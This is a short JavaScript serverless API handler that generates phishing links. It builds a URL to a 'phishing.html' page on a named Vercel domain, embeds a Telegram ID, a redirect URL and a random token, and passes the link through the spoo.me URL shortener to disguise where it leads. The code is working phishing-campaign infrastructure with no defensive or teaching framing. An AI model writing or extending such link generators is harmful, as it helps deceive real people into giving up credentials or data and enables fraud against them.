export default async (req, res) => {
  // Method check
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    // Generate unique token (valid for 24 hours)  
    const token = [...Array(32)].map(() => 
      Math.random().toString(36)[2]).join('');
    
    const expiry = Date.now() + 24 * 60 * 60 * 1000; // 24h expiry
    
    // Original phishing URL
    const longUrl = `https://opaslabs.vercel.app/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
    
    // Shorten with spoo.me
    let shortUrl = longUrl; // Default to long URL
    
    try {
      const response = await fetch('https://spoo.me/api/v1/shorten', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          url: longUrl
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        shortUrl = data.short_url; // Use shortened URL
      }
    } catch (spooError) {
      console.log('Spoo.me shortening failed, using long URL');
    }

    res.status(200).json({ link: shortUrl });

  } catch (error) {
    console.error('Generation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
